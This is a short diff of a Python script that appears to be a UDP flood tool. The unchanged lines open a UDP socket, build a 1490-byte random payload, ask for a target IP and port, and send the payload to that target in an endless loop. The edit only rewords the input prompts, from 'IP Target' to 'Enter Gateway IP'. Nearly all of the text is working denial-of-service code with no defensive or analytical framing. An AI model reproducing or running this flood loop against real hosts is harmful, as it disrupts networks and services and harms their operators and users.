@@ -12,8 +12,8 @@ month = now.month
 year = now.year
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
-ip = input("IP Target : ")
-port = int(input("Port       : "))
+ip = input("Enter Gateway IP : ")
+port = int(input("Enter Port       : "))
 sent = 0
 while True:
     sock.sendto(bytes, (ip, port))
